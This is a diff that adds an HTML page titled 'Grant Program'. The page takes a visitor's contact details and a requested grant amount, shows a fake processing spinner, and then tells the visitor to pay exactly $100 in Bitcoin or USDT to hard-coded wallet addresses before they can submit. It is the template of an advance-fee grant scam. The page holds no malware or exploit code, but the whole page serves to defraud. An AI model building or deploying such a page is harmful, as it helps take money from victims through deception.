@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Grant Program</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
+  <style>
+    body {
+      background: #f2f2f2;
+    }
+    .card {
+      margin-top: 30px;
+    }
+    .shake {
+      animation: shake 0.3s;
+    }
+    @keyframes shake {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      50% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
+      100% { transform: translateX(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1 class="text-center my-4">💰 Grant Program</h1>
+    <div class="card shadow p-4">
+      <form id="grantForm" method="POST">
+        <div class="mb-3">
+          <label for="contact" class="form-label">Contact Information</label>
+          <input type="text" class="form-control" id="contact" name="contact" required>
+        </div>
+        <div class="mb-3">
+          <label for="amount" class="form-label">Preferred Grant Amount ($100 - $50,000)</label>
+          <input type="number" class="form-control" id="amount" name="amount" min="100" max="50000" required>
+        </div>
+
+        <button type="button" id="submitBtn" class="btn btn-primary w-100">Submit</button>
+        <div id="spinner" class="text-center mt-3 d-none">
+          <div class="spinner-border text-primary" role="status"></div>
+        </div>
+      </form>
+
+      <div id="paymentOptions" class="mt-4 d-none">
+        <h5>Select a Payment Method</h5>
+        <button class="btn btn-outline-dark mt-2" onclick="showBitcoin()">Bitcoin</button>
+        <button class="btn btn-outline-dark mt-2" onclick="showUsdt()">USDT</button>
+      </div>
+
+      <div id="bitcoinSection" class="mt-3 d-none">
+        <p>💳 Please pay exactly <strong>$100</strong> in Bitcoin to the address below:</p>
+        <code id="btcAddr">bc1q4c6f7xzsekkpvd2guwkaww4m7se9yjlrxnrjc7</code>
+        <button class="btn btn-sm btn-success mt-1" onclick="copyToClipboard('btcAddr')">Copy Address</button>
+      </div>
+
+      <div id="usdtSection" class="mt-3 d-none">
+        <p>💳 Please pay exactly <strong>$100</strong> using <strong>USDT (Ethereum ERC-20)</strong> to the address below:</p>
+        <code id="usdtAddr">0x08cFE6DDC3b58B0655dD1c9214BcfdDBD3855CCA</code>
+        <button class="btn btn-sm btn-success mt-1" onclick="copyToClipboard('usdtAddr')">Copy Address</button>
+      </div>
+
+      <button id="finalSubmitBtn" type="submit" class="btn btn-success mt-4 d-none w-100">Submit Application</button>
+    </div>
+  </div>
+
+  <script>
+    function showBitcoin() {
+      document.getElementById("bitcoinSection").classList.remove("d-none");
+      document.getElementById("usdtSection").classList.add("d-none");
+      document.getElementById("finalSubmitBtn").classList.remove("d-none");
+    }
+
+    function showUsdt() {
+      document.getElementById("usdtSection").classList.remove("d-none");
+      document.getElementById("bitcoinSection").classList.add("d-none");
+      document.getElementById("finalSubmitBtn").classList.remove("d-none");
+    }
+
+    function copyToClipboard(id) {
+      const el = document.getElementById(id);
+      navigator.clipboard.writeText(el.textContent);
+      alert("Address copied to clipboard!");
+    }
+
+    document.getElementById("submitBtn").addEventListener("click", function () {
+      const contact = document.getElementById("contact");
+      const amount = document.getElementById("amount");
+      if (!contact.value || !amount.value || amount.value < 100 || amount.value > 50000) {
+        if (!contact.value) contact.classList.add("shake");
+        if (!amount.value || amount.value < 100 || amount.value > 50000) amount.classList.add("shake");
+        setTimeout(() => {
+          contact.classList.remove("shake");
+          amount.classList.remove("shake");
+        }, 300);
+        return;
+      }
+
+      document.getElementById("spinner").classList.remove("d-none");
+      setTimeout(() => {
+        document.getElementById("spinner").classList.add("d-none");
+        document.getElementById("paymentOptions").classList.remove("d-none");
+      }, 1500);
+    });
+  </script>
+</body>
+</html>
